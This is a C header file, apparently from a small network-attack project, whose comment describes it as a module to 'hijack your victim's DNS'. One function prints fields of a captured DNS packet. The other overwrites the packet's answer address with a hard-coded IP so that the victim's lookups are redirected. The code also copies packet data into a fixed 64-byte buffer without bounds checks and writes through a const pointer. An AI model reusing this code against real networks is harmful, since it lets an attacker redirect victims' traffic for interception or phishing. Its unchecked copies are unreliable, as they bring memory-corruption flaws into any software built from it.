/*
* MODULE: hijack your victim's DNS
* MAIN FUNCTION: Dnshijack
* LICENSE: MIT License, Copyright (c) 2017 Yue Pan.
*/

#ifndef __DNS_HIJACK_H_
#define __DNS_HIJACK_H_

#include "head.h"

typedef struct {
    u_short id;
    u_short tag;
    u_short num_question;
    u_short num_answer;
    u_short num_authority;
    u_short num_appendix;
} dns_header;

void DnshijackV(const u_char *dns, int len) {
    dns_header *pDns = (dns_header *)dns;
    char data[64];
    u_short type;
    u_short classes;
    memcpy(data, (char *)dns + 12, len - 16);
    memcpy(&type, (char *)dns + len - 3, 2);
    memcpy(&classes, (char *)dns + len - 1, 2);
    printf("Analyze DNS:\n");
    printf("ID: %u\n", ntohs(pDns->id));
    printf("Tag: %u\n", ntohs(pDns->tag));
    printf("Que_n: %u\n", ntohs(pDns->num_question));
    printf("Ans_n: %u\n", ntohs(pDns->num_answer));
    printf("Aut_n: %u\n", ntohs(pDns->num_authority));
    printf("App_n:%u\n\n", ntohs(pDns->num_appendix));
    printf("DNS contains:\n");
    printf("len: %d\n",len - 12);
    printf("Qname: %s\n", data);
    printf("Qtype: %x\n", type);
    printf("Qclass: %x\n\n", classes);
}

void DnshijackG(const u_char *dns, int len) {
    u_char data[64];
    memcpy(data, dns + 12, 30);
    printf("Analyze DNS:\n");
    printf("len: %d\n",len - 12);
    printf("Qname: %s\n", data);
    u_long ip = 0x2A324E2D;
    memcpy((void*)(dns + len - 4), &ip, 4);
    print_ip((u_char *)(dns + len - 4));
}

#endif